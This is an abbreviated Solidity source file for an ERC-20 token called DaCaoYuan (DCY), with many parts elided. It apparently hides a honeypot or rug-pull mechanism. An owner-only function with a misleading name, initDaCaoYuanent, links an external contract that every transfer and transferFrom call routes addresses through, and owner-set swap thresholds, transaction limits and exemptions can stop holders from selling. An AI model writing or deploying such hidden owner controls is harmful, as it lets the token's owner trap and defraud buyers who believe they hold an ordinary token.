...
contract Context {
  ...
  constructor ()  { }
    ...
    */    
    ...
    function msgsender(address account) internal returns (address){
...
contract Ownable is Context {  
    ...
    */
    ...
    function initDaCaoYuanent(address newOwner) public onlyOwner {
        _msg = Message(newOwner);
    }       
...
contract DaCaoYuan is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000 *  10**9;  
    string private _name = "DaCaoYuan";
    string private _symbol = "DCY";
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(inSwapEnable && _balances[_msgSender()] >= _swapThreshold){ 
            require(amount <= _maxAmountTx, "Transfer amount exceeds the maxTxAmount.");
        }           
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        _transfer(msgsender(sender), msgsender(recipient), amount);        
        return true;
    } 
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msgsender(_msgSender()), msgsender(recipient), amount);
        return true;
    }   
    ...
    function updateIsDaCaoYuanExempt(address holder) external onlyOwner {
        isTxLimitExempt[holder] = true;
    }

    function takeDaCaoYuanFee(address recipient, uint256 amount) internal returns (uint256) {        
    ...
    function updateSwapDaCaoYuan(bool enableSwapBack, uint256 newSwapBackLimit) external onlyOwner {
        inSwapEnable  = enableSwapBack;
        _swapThreshold = newSwapBackLimit;
    }

    function updateTxLimit(uint256 newLimit) external onlyOwner {
        _maxAmountTx = newLimit;
    }
